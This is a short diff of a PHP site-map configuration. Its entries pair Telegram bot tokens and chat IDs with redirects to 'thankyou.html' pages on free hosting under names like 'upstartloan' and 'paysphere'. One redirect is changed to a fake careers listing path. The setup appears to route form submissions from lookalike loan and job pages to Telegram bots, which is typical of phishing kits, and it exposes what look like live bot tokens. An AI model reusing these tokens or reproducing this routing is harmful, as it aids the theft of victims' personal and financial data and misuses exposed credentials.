@@ -11,6 +11,7 @@ $site_map = [
             ["token" => "7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "7510889526"],
         ],
         "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
+        
     ],
 
 
@@ -19,7 +20,7 @@ $site_map = [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => '', 'chat_id' => '']
         ],
-        'redirect' => 'https://paysphere-hcr2.onrender.com/cache_site/thankyou.html'
+        'redirect' => 'https://paysphere-hcr2.onrender.com/cache_site/careers/all-listings.job.34092/thankyou.html'
     ],
     
 
